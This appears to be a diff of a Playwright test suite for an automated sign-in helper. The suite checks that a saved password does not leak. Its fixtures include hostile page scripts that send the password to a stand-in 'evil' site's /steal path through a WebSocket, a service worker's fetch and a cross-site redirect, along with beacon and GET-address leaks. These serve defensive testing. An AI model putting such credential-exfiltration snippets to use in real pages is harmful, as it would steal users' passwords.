@@ -1,7 +1,9 @@
+import { createHash } from "node:crypto";
 import { once } from "node:events";
 import type { IncomingMessage, ServerResponse } from "node:http";
 import { createServer } from "node:http";
 import type { AddressInfo } from "node:net";
+import type { Duplex } from "node:stream";
 
 import type { Page as WorkerPage } from "@cloudflare/playwright";
 import type { Browser, BrowserContext, Page } from "playwright";
@@ -20,7 +22,7 @@ interface Hit {
 
 type Handler = (request: IncomingMessage, response: ServerResponse, body: string) => void;
 
-/** A local site on its own host, so two of them are two origins. Records every request with its body. */
+/** A local site on its own host, so two of them are two origins. Records every request with its body, and every WebSocket it accepts and each frame sent on one. */
 const site = async (host: string, handler: Handler) => {
     const hits: Hit[] = [];
     const server = createServer((request, response) => {
@@ -35,6 +37,19 @@ const site = async (host: string, handler: Handler) => {
         });
     });
 
+    server.on("upgrade", (request: IncomingMessage, socket: Duplex) => {
+        hits.push({ body: "", method: "WEBSOCKET", url: request.url ?? "" });
+        // The low four bits of a frame's first byte: 1 is text, 8 is a close.
+        socket.on("data", (frame: Buffer) => {
+            hits.push({ body: "", method: `FRAME ${(frame[0] ?? 0) & 0x0f}`, url: request.url ?? "" });
+        });
+        socket.write(
+            // eslint-disable-next-line sonarjs/hashing -- the WebSocket handshake is defined with SHA-1
+            `HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1")
+                .update(`${request.headers["sec-websocket-key"] ?? ""}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
+                .digest("base64")}\r\n\r\n`,
+        );
+    });
     server.listen(0, host);
     await once(server, "listening");
 
@@ -59,7 +74,7 @@ describe(signIn, () => {
     let evil: Awaited<ReturnType<typeof site>>;
     let login: Awaited<ReturnType<typeof site>>;
     /** What the login site serves at `/` and answers at `/session`; each case sets them. */
-    const fixture: { home: string; onSession: Handler; page: string } = { home: "", onSession: () => undefined, page: "" };
+    const fixture: { home: string; onSession: Handler; page: string; worker: string } = { home: "", onSession: () => undefined, page: "", worker: "" };
 
     beforeAll(async () => {
         browser = await chromium.launch();
@@ -67,8 +82,11 @@ describe(signIn, () => {
         login = await site("127.0.0.1", (request, response, body) => {
             if (request.url === "/session") {
                 fixture.onSession(request, response, body);
-            } else if (request.url === "/home") {
+            } else if (request.url?.startsWith("/home")) {
                 html(response, fixture.home);
+            } else if (request.url === "/worker.js") {
+                response.setHeader("content-type", "text/javascript");
+                response.end(fixture.worker);
             } else {
                 html(response, fixture.page);
             }
@@ -178,14 +196,14 @@ describe(signIn, () => {
 
     it("signs in through a script that posts the login as JSON", async () => {
         fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value }), method: "POST" }); });`,
+            `document.forms[0].addEventListener("submit", async (event) => { event.preventDefault(); await fetch("/session", { body: JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value }), method: "POST" }); });`,
         );
         fixture.onSession = (_request, response) => response.end("{}");
 
         const result = await run();
 
         expect(result).toMatchObject({ submitted: true, success: true });
-        expect(sessionPosts()).toStrictEqual([{ body: JSON.stringify({ pw: SAVED_SECRET }), method: "POST", url: "/session" }]);
+        expect(sessionPosts()).toStrictEqual([{ body: JSON.stringify({ pw: SAVED_SECRET, user: "ann" }), method: "POST", url: "/session" }]);
     });
 
     it("waits for a slow server's answer before it reports where the form landed", async () => {
@@ -252,16 +270,22 @@ describe(signIn, () => {
         expect(sessionPosts()).toStrictEqual([]);
     });
 
-    it.each([307, 308])("fails a %i redirect that would carry the password to another site", async (status) => {
+    it.each([
+        [307, "to another site", () => `${evil.origin}/steal`],
+        [308, "to another site", () => `${evil.origin}/steal`],
+        // The browser takes this address; a strict URL parser does not.
+        // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
+        [307, "whose address does not parse", () => "http://a b/"],
+    ])("fails a %i redirect %s, and reports the form as sent", async (status, _where, location) => {
         fixture.page = loginForm();
         fixture.onSession = (_request, response) => {
-            response.writeHead(status, { location: `${evil.origin}/steal` });
+            response.writeHead(status, { location: location() });
             response.end();
         };
 
         const result = await run();
 
-        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: false, success: false });
+        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: true, success: false });
         expect(evil.hits).toStrictEqual([]);
     });
 
@@ -304,7 +328,21 @@ describe(signIn, () => {
         expect(await page.inputValue("[name=user]")).toBe("");
     });
 
-    it("stops and clears the field when the hold ends after the password was typed", async () => {
+    it("reports a sign-in whose answer fails to load as sent, not signed in", async () => {
+        fixture.page = loginForm();
+        fixture.onSession = (_request, response) => {
+            // A redirect the browser itself refuses to follow.
+            // eslint-disable-next-line sonarjs/no-clear-text-protocols -- a malformed address, never loaded
+            response.writeHead(307, { location: "http://[" });
+            response.end();
+        };
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("did not load"), submitted: true, success: false });
+    });
+
+    it("closes the page and the session when the hold ends after the password was typed", async () => {
         let offset = 0;
 
         await page.exposeFunction("endHold", () => {
@@ -314,9 +352,24 @@ describe(signIn, () => {
 
         const result = await run(() => Date.now() + offset);
 
-        expect(result).toMatchObject({ error: expect.stringContaining("ran out of time"), submitted: false, success: false });
+        expect(result).toMatchObject({ sessionClosed: true, submitted: false, success: false });
         expect(sessionPosts()).toStrictEqual([]);
-        expect(await passwordLeft()).toBe(false);
+        expect(page.isClosed()).toBe(true);
+    });
+
+    it("closes the page rather than clear it past the hold when the sign-in lands at its end", async () => {
+        let offset = 0;
+
+        await page.exposeFunction("endHold", () => {
+            offset = 60_000;
+        });
+        fixture.page = loginForm();
+        fixture.home = `<h1>Home</h1><script>window.endHold();</script>`;
+
+        const result = await run(() => Date.now() + offset);
+
+        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
+        expect(page.isClosed()).toBe(true);
     });
 
     it("scrubs the password from the URL and title it reads back", async () => {
@@ -329,5 +382,128 @@ describe(signIn, () => {
         const result = await run();
 
         expect(result).toMatchObject({ success: true, url: `${login.origin}/home?echo=[password]` });
+    });
+
+    it.each([
+        ["switches the form to GET", `document.forms[0].addEventListener("submit", () => { document.forms[0].method = "get"; });`],
+        [
+            "navigates with it in the address",
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); location.href = "/next?pw=" + encodeURIComponent(document.forms[0].pw.value); });`,
+        ],
+    ])("blocks a same-origin request that carries the password in its address when a submit handler %s", async (_what, script) => {
+        fixture.page = loginForm(script);
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("in an address"), submitted: false, success: false });
+        expect(login.hits.filter((hit) => hit.url.includes(SAVED_SECRET))).toStrictEqual([]);
+    });
+
+    it("closes the session when the reloaded page shows the password as text", async () => {
+        let echoed = "";
+
+        fixture.page = loginForm();
+        fixture.onSession = (_request, response, body) => {
+            echoed = new URLSearchParams(body).get("pw") ?? "";
+            response.writeHead(303, { location: "/home" });
+            response.end();
+        };
+        // The site renders what it was sent, as a page could from its own records.
+        Object.defineProperty(fixture, "home", { configurable: true, get: () => `<p>Signed in with ${echoed}</p>` });
+
+        const result = await run();
+
+        Reflect.deleteProperty(fixture, "home");
+
+        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
+        expect(page.isClosed()).toBe(true);
+    });
+
+    it.each([
+        ["a beacon of the whole form", `navigator.sendBeacon("/beacon", new FormData(document.forms[0]));`],
+        ["a fetch with the password alone", `fetch("/check", { body: document.forms[0].pw.value, method: "POST" });`],
+    ])("does not count %s as the sign-in", async (_what, send) => {
+        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); ${send} });`);
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
+    });
+
+    it("refuses a WebSocket to another site while the password is in the page", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + document.forms[0].pw.value); });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it("closes a WebSocket to another site the page opened before the password was typed", async () => {
+        fixture.page = loginForm(
+            `const socket = new WebSocket("${evil.origin.replace("http", "ws")}/live"); document.forms[0].addEventListener("submit", () => { try { socket.send(document.forms[0].pw.value); } catch {} });`,
+        );
+        // The page is only filled once its socket is open.
+        fixture.page += `<script>document.forms[0].pw.type = "text"; new Promise((resolve) => setTimeout(resolve, 300)).then(() => { document.forms[0].pw.type = "password"; });</script>`;
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(evil.hits.map((hit) => hit.method).filter((method) => method !== "FRAME 8")).toStrictEqual(["WEBSOCKET"]);
+    });
+
+    it("sees the form's POST past a service worker that would answer it itself", async () => {
+        fixture.page = loginForm();
+        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("fetch", (event) => { if (event.request.method === "POST") event.respondWith(new Response("held")); });`;
+        await page.goto(`${login.origin}/`);
+        await page.evaluate(async () => {
+            await navigator.serviceWorker.register("/worker.js");
+            await navigator.serviceWorker.ready;
+        });
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
+        expect(sessionPosts()).toHaveLength(1);
+    });
+
+    it("blocks a service worker that the page hands the password to", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.serviceWorker.controller.postMessage(document.forms[0].pw.value); });`,
+        );
+        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => { fetch("${evil.origin}/steal", { body: event.data, method: "POST", mode: "no-cors" }); });`;
+        await page.goto(`${login.origin}/`);
+        await page.evaluate(async () => {
+            await navigator.serviceWorker.register("/worker.js");
+            await navigator.serviceWorker.ready;
+        });
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it("counts the form's own POST as sent when the page re-encodes the password first", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", () => { const field = document.forms[0].pw; field.value = [...field.value].reverse().join(""); });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(sessionPosts()).toHaveLength(1);
+    });
+
+    it("stops waiting on a submit handler that does not return", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const end = Date.now() + 7000; while (Date.now() < end) {} });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("did not finish"), submitted: false, success: false });
     });
 });
